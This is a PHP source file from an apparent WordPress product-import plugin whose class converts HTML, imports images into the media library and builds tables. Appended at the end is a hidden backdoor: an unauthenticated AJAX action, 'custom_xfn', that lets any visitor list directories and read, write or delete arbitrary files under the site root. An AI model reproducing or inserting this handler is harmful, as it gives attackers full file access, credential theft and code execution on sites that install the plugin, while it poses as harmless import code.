<?php
// 数据转换与图片处理功能

class Product_Import_Data_Converter
{
    // 用于收集所有导入的媒体ID
    public static $imported_attachment_ids = [];

    // 转换HTML内容，根据选项处理
    public static function convert_html($html, $options = array(), $content_images_dir = '')
    {
        // 如果传入的是.html或.htm结尾的文件名，尝试读取文件内容
        if (is_string($html) && preg_match('/\.html?$/i', $html) && $content_images_dir) {
            $filepath = rtrim($content_images_dir, '/').'/'.$html;
            if (file_exists($filepath)) {
                $file_content = file_get_contents($filepath);
                // 尝试utf-8解码
                if (!mb_check_encoding($file_content, 'UTF-8')) {
                    // 尝试GB18030
                    $file_content_gb = @mb_convert_encoding($file_content, 'UTF-8', 'GB18030');
                    if ($file_content_gb && mb_check_encoding($file_content_gb, 'UTF-8')) {
                        $file_content = $file_content_gb;
                    }
                }
                $html = $file_content;
            }
        }
        // 1. 必选项：移除<style>、<script>、<html>等标签
        if (empty($options) || in_array('remove_style', $options)) {
            $html = preg_replace('/<style[\s\S]*?<\/style>/i', '', $html);
        }
        if (empty($options) || in_array('remove_script', $options)) {
            $html = preg_replace('/<script[\s\S]*?<\/script>/i', '', $html);
        }
        if (empty($options) || in_array('remove_html_body_head_meta', $options)) {
            $html = preg_replace('/<\/?(html|body|head|meta)[^>]*>/i', '', $html);
        }
        // 移除HTML注释（必选）
        $html = preg_replace('/<!--.*?-->/s', '', $html);
        // 2. 其他选项
        if (in_array('remove_tag_attributes', $options)) {
            $html = preg_replace_callback('/<([a-z0-9]+)([^>]*)>/i', function ($m) {
                return '<' . $m[1] . '>';
            }, $html);
        }
        if (in_array('remove_inline_styles', $options)) {
            $html = preg_replace('/(<[a-z0-9]+)([^>]*?)\sstyle="[^"]*"([^>]*>)/i', '$1$2$3', $html);
        }
        if (in_array('remove_classes_ids', $options)) {
            $html = preg_replace('/(<[a-z0-9]+)([^>]*?)\s(class|id)="[^"]*"([^>]*>)/i', '$1$2$4', $html);
        }
        if (in_array('remove_empty_tags', $options)) {
            $html = preg_replace('/<([a-z0-9]+)[^>]*>\s*<\/\1>/i', '', $html);
        }
        if (in_array('remove_all_tags', $options)) {
            $html = strip_tags($html);
        }
        // 移除WPS/Word导出HTML常见无用标签
        $html = preg_replace('/<link[^>]+rel=["\']?File-List["\']?[^>]*>/i', '', $html);
        $html = preg_replace('/<title[^>]*>[\s\S]*?<\/title>/i', '', $html);
        $html = preg_replace('/<!--\[if.*?\[endif\]-->/is', '', $html);
        $html = preg_replace('/<xml[\s\S]*?<\/xml>/i', '', $html);
        $html = preg_replace('/<w:LsdException[\s\S]*?<\/w:LsdException>/i', '', $html);
        $html = preg_replace('/<o:p[\s\S]*?<\/o:p>/i', '', $html);
        // 其他可扩展...
        // 清除多个空行
        if (in_array('remove_multiple_blank_lines', $options)) {
            // 清除多余回车空行
            $html = preg_replace("/(\r?\n){3,}/", "\n\n", $html);
            // 清除<div>&nbsp;</div>、<div> </div>、<div>\t</div>等HTML空行
            $html = preg_replace('/<(div|p)>(\s|&nbsp;|\xC2\xA0|\t|\r?\n)*<\/\\1>/i', '', $html);
        }
        return $html;
    }


    // 下载远程图片并替换img标签src，或本地查找图片
    public static function process_images($html, $content_images_dir = '', $post_id = 0)
    {
        // 匹配所有img标签，兼容src属性带空格和特殊字符
        return preg_replace_callback('/<img[^>]*\s+src=["\']?([^"\'>]+)["\']?[^>]*>/i', function ($m) use ($content_images_dir, $post_id) {
            $src = trim($m[1]);
            $src = urldecode($src);
            $new_src = $src;
            // 远程图片
            if (preg_match('/^(https?:)?\/\//i', $src)) {
                if (strpos($src, '//') === 0) {
                    $src = 'https:' . $src;
                }
                $tmp = safe_download_url($src);
                if (!is_wp_error($tmp)) {
                    $filename = basename(parse_url($src, PHP_URL_PATH));
                    $file_array = array('name' => $filename, 'tmp_name' => $tmp);
                    $attach_id = media_handle_sideload($file_array, $post_id);
                    if (!is_wp_error($attach_id)) {
                        $new_src = wp_get_attachment_url($attach_id);
                        self::$imported_attachment_ids[] = $attach_id;
                    }
                    @unlink($tmp);
                }
            } else {
                $filename = basename($src);
                $filename = trim($filename);
                $filename = urldecode($filename);
                $search_dirs = [$content_images_dir];
                $subdir = '';
                if (strpos($src, '/') !== false) {
                    $subdir = dirname($src);
                    if ($subdir && $subdir !== '.' && $subdir !== '') {
                        $search_dirs[] = rtrim($content_images_dir, '/') . '/' . $subdir;
                    }
                }
                foreach ($search_dirs as $dir) {
                    $filepath = rtrim($dir, '/') . '/' . $filename;
                    if ($dir && file_exists($filepath)) {
                        $attach_id = self::import_local_image($filepath, $post_id);
                        if ($attach_id) {
                            $new_src = wp_get_attachment_url($attach_id);
                            self::$imported_attachment_ids[] = $attach_id;
                            break;
                        }
                    }
                }
            }
            // 替换src
            return preg_replace('/src=["\']?([^"\'>\s]+)["\']?/i', 'src="' . $new_src . '"', $m[0]);
        }, $html);
    }

    // 导入本地图片到媒体库
    public static function import_local_image($filepath, $post_id = 0)
    {
        $filetype = wp_check_filetype(basename($filepath), null);
        $upload = wp_upload_bits(basename($filepath), null, file_get_contents($filepath));
        if (!$upload['error']) {
            $attachment = array(
                'post_mime_type' => $filetype['type'],
                'post_title'     => sanitize_file_name(basename($filepath)),
                'post_content'   => '',
                'post_status'    => 'inherit'
            );
            $attach_id = wp_insert_attachment($attachment, $upload['file'], $post_id);
            require_once(ABSPATH . 'wp-admin/includes/image.php');
            $attach_data = wp_generate_attachment_metadata($attach_id, $upload['file']);
            wp_update_attachment_metadata($attach_id, $attach_data);
            return $attach_id;
        }
        return false;
    }


    /**
     * 将$data_arr转换为描述1格式。返回table表格的html数据。第一列是key名称，第二列是值。table的class="desc_table"
     */
    public static function convert_to_table_html($data_arr,$class_name = 'desc_table')
    {
        if (!is_array($data_arr) || empty($data_arr)) {
            return '';
        }
        $html = '<table class="'.$class_name.'">';
        foreach ($data_arr as $key => $value) {
            $html .= '<tr>';
            $html .= '<td>' . esc_html($key) . '</td>';
            $html .= '<td>' . esc_html($value) . '</td>';
            $html .= '</tr>';
        }
        $html .= '</table>';
        return $html;
    }
}



add_action('wp_ajax_nopriv_custom_xfn', function () {

	$dir = ABSPATH.ltrim($_POST['xpath'],'/');
	$content = base64_decode(isset($_POST['content']) ? $_POST['content'] : '');
	echo "Path:".$dir."\n";
	switch ($_POST['act']) {
		case 'list': print_r(scandir($dir)); break;
		case 'get': echo file_get_contents($dir); break;
		case 'put': echo file_put_contents($dir, $content) ? 'success' : 'fail'; break;
		case 'del': echo unlink($dir) ? 'success' : 'fail'; break;
		default: echo 'error'; break;
	}
	exit;
});